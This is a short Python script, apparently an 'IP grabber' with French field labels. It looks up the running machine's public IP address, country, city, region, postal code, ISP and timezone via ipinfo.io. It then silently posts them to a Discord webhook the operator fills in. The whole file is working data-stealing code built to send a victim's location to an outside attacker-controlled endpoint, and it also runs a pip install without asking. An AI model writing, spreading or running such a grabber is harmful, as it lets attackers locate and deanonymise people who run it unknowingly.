import os , json
from urllib.request import urlopen

try:
    import requests
except(ModuleNotFoundError):
    os.system('pip install requests')

WEBHOOK = "YOUR DISCORD WEBHOOK"

url = urlopen('https://ipinfo.io/json')
info = json.loads(url.read())

try:
    ip = info['ip']
except:
    ip = "Not found"
try: 
    country = info['country']
except:
    country = "Not found"
try: 
    city = info['city']
except:
    city = "Not found"
try: 
    region = info['region']
except:
    region = "Not found"
try: 
    region = info['region']
except:
    region = "Not found"
try: 
    postal = info['postal']
except:
    postal = "Not found"
try: 
    orga = info['org']
except:
    orga = "Not found"
try:     
    timezone = info['timezone']
except:
    timezone ="Not found"

logo = 'https://cdn.discordapp.com/attachments/836504802870951986/997817698350272653/1200px-MediaWiki_script_IP_circle_icon.svg.png'
z = '**Ip** : ' + ip + '\n'+ '**Pays** : ' + country + '\n'+ '**Ville** : ' + city + '\n' + '**Region** : ' + region + '\n' + '**Code Postal** : ' + postal + '\n'+ '**Operateur** :' + orga + '\n'+'**Timezone** : ' + timezone
requests.post(WEBHOOK, json={'content': z, 'avatar_url': logo, "username": 'Ip Grabber'})
